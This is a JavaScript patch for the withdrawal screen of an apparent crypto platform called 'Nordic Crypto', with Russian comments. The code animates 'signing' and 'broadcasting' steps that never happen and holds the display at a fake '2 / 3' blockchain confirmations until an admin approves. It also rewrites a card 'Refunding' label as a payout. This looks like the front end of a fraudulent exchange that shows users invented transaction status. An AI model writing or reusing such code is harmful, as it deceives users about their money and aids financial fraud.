/* ============================================================
   NORDIC CRYPTO — WITHDRAWAL CONFIRMATIONS v1.0
   ============================================================
   Патчит withdraw-flow.js:
     • Убирает "Refunding" → "Processing card payout"
     • Crypto: 2/3 confirmations → ждёт approve
     • IBAN: Pending review → Sent to bank
     • Card: Pending review → Payout processed
   
   Live-обновление статуса через fixes.js::syncWithdrawStatuses.
   ============================================================ */

(function () {
  'use strict';

  var WC_VERSION = '1.0.0';

  function $(id) { return document.getElementById(id); }

  // ============================================================
  // 1. Override processCrypto — показываем 2/3 и ждём
  // ============================================================

  /**
   * Возвращает правильные тексты для метода + статуса
   */
  function getTexts(method, status) {
    var map = {
      iban: {
        pending: {
          icon: '🏦',
          title: 'Processing bank transfer',
          desc: 'Your request is under review.<br>Bank transfers usually take 1–3 business days.',
          rowLabel: 'Status',
          rowValue: 'Pending review',
          rowClass: 'warning'
        },
        approved: {
          icon: '✓',
          title: 'Transfer sent to bank',
          desc: 'Your bank transfer has been processed.',
          rowLabel: 'Status',
          rowValue: 'Sent to bank',
          rowClass: 'positive'
        },
        rejected: {
          icon: '✗',
          title: 'Transfer rejected',
          desc: 'Your withdrawal was rejected.',
          rowLabel: 'Status',
          rowValue: 'Rejected',
          rowClass: 'negative'
        }
      },
      card: {
        pending: {
          icon: '💳',
          title: 'Processing card payout',
          desc: 'Your card payout is being initiated.<br>Payouts usually take 3–5 business days.',
          rowLabel: 'Status',
          rowValue: 'Pending review',
          rowClass: 'warning'
        },
        approved: {
          icon: '✓',
          title: 'Payout processed',
          desc: 'Your card payout has been sent.',
          rowLabel: 'Status',
          rowValue: 'Payout processed',
          rowClass: 'positive'
        },
        rejected: {
          icon: '✗',
          title: 'Payout rejected',
          desc: 'Your card payout was rejected.',
          rowLabel: 'Status',
          rowValue: 'Rejected',
          rowClass: 'negative'
        }
      },
      crypto: {
        pending: {
          icon: '⛓️',
          title: 'Broadcasting transaction',
          desc: 'Your crypto withdrawal is being broadcast to the network.',
          rowLabel: 'Confirmations',
          rowValue: '2 / 3',
          rowClass: 'warning'
        },
        approved: {
          icon: '✓',
          title: 'Transaction confirmed',
          desc: 'Your crypto withdrawal has been confirmed on the network.',
          rowLabel: 'Confirmations',
          rowValue: '3 / 3 ✓',
          rowClass: 'positive'
        },
        rejected: {
          icon: '✗',
          title: 'Transaction rejected',
          desc: 'Your crypto withdrawal was rejected.',
          rowLabel: 'Confirmations',
          rowValue: '0 / 3 ✗',
          rowClass: 'negative'
        }
      }
    };
    return (map[method] && map[method][status]) || map[method].pending;
  }

  /**
   * Override processCrypto из withdraw-flow.js.
   * Вместо того чтобы сразу показывать 3/3, показываем 2/3 и ждём approve.
   */
  window.__ncOriginalProcessCrypto = window.processCrypto;

  // Экспонируем функцию для использования в fixes.js
  window.__ncRenderWithdrawProcessing = function (method, amount, details, status) {
    status = status || 'pending';
    var texts = getTexts(method, status);

    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    var detailsHtml = '';

    if (method === 'crypto') {
      detailsHtml =
        row('Network', details.network || '—') +
        row('To', truncate(details.address || '', 10, 8)) +
        row('Confirmations', texts.rowValue, texts.rowClass);
    } else if (method === 'iban') {
      detailsHtml =
        row('Recipient', details.name || '—') +
        row('IBAN', truncate(details.iban || '', 8, 4)) +
        row(texts.rowLabel, texts.rowValue, texts.rowClass);
    } else if (method === 'card') {
      var last4 = (details.cardNumber || '').replace(/\s/g, '').slice(-4);
      detailsHtml =
        row('Card', '•••• ' + last4) +
        row(texts.rowLabel, texts.rowValue, texts.rowClass);
    }

    processing.innerHTML =
      '<div class="wd-processing-icon ' + method + '">' + texts.icon + '</div>' +
      '<h3 class="wd-processing-title">' + texts.title + '</h3>' +
      '<p class="wd-processing-desc">' + texts.desc + '</p>' +
      '<div class="wd-live-data">' + detailsHtml + '</div>';

    processing.classList.add('on');
  };

  // Патчим processCrypto (из withdraw-flow.js) — теперь 2/3
  window.processCrypto = function (amount, details) {
    var coin = details.coin || 'USDT';
    var network = details.network || 'ERC20';
    var address = details.address || '';

    var processing = document.querySelector('.wd-processing');
    if (!processing) return;

    processing.innerHTML =
      '<div class="wd-processing-icon crypto">⛓️</div>' +
      '<h3 class="wd-processing-title">Broadcasting transaction</h3>' +
      '<p class="wd-processing-desc">Sending ' + fmtCrypto(amount, coin) + ' to ' + escapeSafe(network) + ' network.</p>' +
      '<div class="wd-network-viz" id="wdNetworkViz">' +
        '<div class="wd-network-node active"></div>' +
        '<div class="wd-network-line"></div>' +
        '<div class="wd-network-node active"></div>' +
        '<div class="wd-network-line"></div>' +
        '<div class="wd-network-node"></div>' +
        '<div class="wd-network-line"></div>' +
        '<div class="wd-network-node"></div>' +
      '</div>' +
      '<div class="wd-progress-steps" id="wdSteps"></div>' +
      '<div class="wd-live-data" id="wdLiveData"></div>';

    // Показываем форму → processing
    var formStage = document.querySelector('.wd-form-stage');
    if (formStage) formStage.style.display = 'none';

    // Анимируем шаги: 1 шаг → 2 шага → остановка на 2/3
    runCryptoStepsWaiting(amount, details, coin, network, address);
  };

  /**
   * Анимирует шаги до 2/3 и останавливается (ждёт approve админа).
   */
  function runCryptoStepsWaiting(amount, details, coin, network, address) {
    var stepsEl = $('wdSteps');
    if (!stepsEl) return;

    var steps = [
      { text: 'Signing transaction', duration: 900 },
      { text: 'Broadcasting to network', duration: 1200 },
      { text: 'Awaiting confirmations', duration: 0 }  // ∞ — ждём approve
    ];

    stepsEl.innerHTML = '';
    steps.forEach(function (s, i) {
      var step = document.createElement('div');
      step.className = 'wd-step';
      step.id = 'wdStep' + i;
      step.innerHTML =
        '<div class="wd-step-icon">' + (i + 1) + '</div>' +
        '<div class="wd-step-text">' + s.text + '</div>' +
        '<div class="wd-step-time"></div>';
      stepsEl.appendChild(step);
    });

    // Шаг 0
    setTimeout(function () {
      var s0 = $('wdStep0');
      if (s0) {
        s0.classList.add('active');
        s0.querySelector('.wd-step-icon').textContent = '…';
        s0.querySelector('.wd-step-time').textContent = 'in progress';
      }
    }, 0);

    // Шаг 1
    setTimeout(function () {
      var s0 = $('wdStep0');
      if (s0) {
        s0.classList.remove('active');
        s0.classList.add('done');
        s0.querySelector('.wd-step-icon').textContent = '✓';
        s0.querySelector('.wd-step-time').textContent = 'done';
      }
      var s1 = $('wdStep1');
      if (s1) {
        s1.classList.add('active');
        s1.querySelector('.wd-step-icon').textContent = '…';
        s1.querySelector('.wd-step-time').textContent = 'in progress';
      }
    }, 900);

    // Шаг 2 (ждём)
    setTimeout(function () {
      var s1 = $('wdStep1');
      if (s1) {
        s1.classList.remove('active');
        s1.classList.add('done');
        s1.querySelector('.wd-step-icon').textContent = '✓';
        s1.querySelector('.wd-step-time').textContent = 'done';
      }
      var s2 = $('wdStep2');
      if (s2) {
        s2.classList.add('active');
        s2.querySelector('.wd-step-icon').textContent = '⏳';
        s2.querySelector('.wd-step-time').textContent = 'awaiting';
      }

      // Обновляем live-data: 2/3
      var liveEl = $('wdLiveData');
      if (liveEl) {
        liveEl.innerHTML =
          row('Amount', fmtCrypto(amount, coin)) +
          row('Network', escapeSafe(network)) +
          row('To', truncate(address, 10, 8), 'muted') +
          row('Confirmations', '<span id="wdConfirmations">2 / 3</span>', 'warning');
      }
    }, 2100);
  }

  /**
   * Обновляет UI при approve/reject от админа.
   * Вызывается из fixes.js::syncWithdrawStatuses.
   */
  window.__ncUpdateWithdrawConfirmations = function (wd) {
    if (!wd) return;
    var method = wd.method || 'iban';
    var status = wd.status === 'approved' ? 'approved'
               : wd.status === 'rejected' ? 'rejected'
               : 'pending';

    // Обновляем модалку, если она открыта
    var modal = $('withdrawModal');
    if (modal && modal.style.display !== 'none') {
      var processing = document.querySelector('.wd-processing');
      var success = document.querySelector('.wd-success');
      var processingVisible = processing && processing.classList.contains('on');
      var successVisible = success && success.classList.contains('on');

      if (processingVisible || successVisible) {
        // Перерисовываем с новым статусом
        var details = wd.details || {};
        var amount = wd.amount || 0;

        if (processingVisible) {
          // Через 400мс обновляем до финального состояния
          setTimeout(function () {
            window.__ncRenderWithdrawProcessing(method, amount, details, status);
          }, 400);
        }
      }
    }
  };

  // ============================================================
  // 2. Utility
  // ============================================================

  function row(label, value, cls) {
    return '<div class="wd-live-row">' +
      '<span class="wd-live-label">' + label + '</span>' +
      '<span class="wd-live-value ' + (cls || '') + '">' + value + '</span>' +
    '</div>';
  }

  function truncate(str, start, end) {
    str = String(str || '');
    if (str.length <= start + end + 3) return escapeSafe(str);
    return escapeSafe(str.slice(0, start)) + '…' + escapeSafe(str.slice(-end));
  }

  function escapeSafe(s) {
    if (typeof window.escapeHtml === 'function') return window.escapeHtml(s);
    return String(s).replace(/[&<>"']/g, function (c) {
      return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
    });
  }

  function fmtCrypto(n, symbol) {
    var d = (symbol === 'USDT') ? 2 : 8;
    return Number(n).toFixed(d) + ' ' + symbol;
  }

  // ============================================================
  // 3. Override success-экраны — убираем "Refund"
  // ============================================================

  // Патчим showCardSuccess
  window.showCardSuccess = function (amount, details, last4) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    success.innerHTML =
      '<div class="wd-success-icon">✓</div>' +
      '<h3 class="wd-success-title">Payout submitted</h3>' +
      '<p class="wd-success-desc">Your card payout is under review.</p>' +
      '<div class="wd-success-amount">' + fmtMoneySafe(amount) + '</div>' +
      '<div class="wd-success-details">' +
        row('Card', '•••• ' + last4) +
        row('Status', 'Pending review', 'warning') +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    success.classList.add('on');
    if (typeof window.playChime === 'function') window.playChime();
  };

  // Патчим showIbanSuccess
  window.showIbanSuccess = function (amount, details) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    success.innerHTML =
      '<div class="wd-success-icon">✓</div>' +
      '<h3 class="wd-success-title">Transfer submitted</h3>' +
      '<p class="wd-success-desc">Your bank transfer is under review.</p>' +
      '<div class="wd-success-amount">' + fmtMoneySafe(amount) + '</div>' +
      '<div class="wd-success-details">' +
        row('Recipient', escapeSafe(details.name || '—')) +
        row('IBAN', truncate(details.iban || '', 8, 4)) +
        row('Status', 'Pending review', 'warning') +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    success.classList.add('on');
    if (typeof window.playChime === 'function') window.playChime();
  };

  // Патчим showCryptoSuccess
  window.showCryptoSuccess = function (amount, details, coin, network, txHash) {
    var success = document.querySelector('.wd-success');
    if (!success) return;

    success.innerHTML =
      '<div class="wd-success-icon">✓</div>' +
      '<h3 class="wd-success-title">Transaction broadcast</h3>' +
      '<p class="wd-success-desc">Your crypto withdrawal is being confirmed on the network.</p>' +
      '<div class="wd-success-amount">' + fmtCrypto(amount, coin) + '</div>' +
      '<div class="wd-success-details">' +
        row('To', truncate(details.address || '', 10, 8), 'muted') +
        row('Network', escapeSafe(network)) +
        row('Confirmations', '<span id="wdSuccessConfirmations">2 / 3</span>', 'warning') +
      '</div>' +
      '<div class="wd-success-actions">' +
        '<button class="wd-btn wd-btn-cancel" onclick="closeWithdraw()">Close</button>' +
      '</div>';

    success.classList.add('on');
    if (typeof window.playChime === 'function') window.playChime();
  };

  function fmtMoneySafe(n) {
    if (typeof window.fmtMoney === 'function') return window.fmtMoney(n);
    return '$' + Number(n).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  }

  console.log(
    '%c[NordicCrypto] ✅ withdraw-confirmations.js v' + WC_VERSION + ' loaded',
    'color:#8b5cf6;font-weight:bold;font-size:13px'
  );

})();
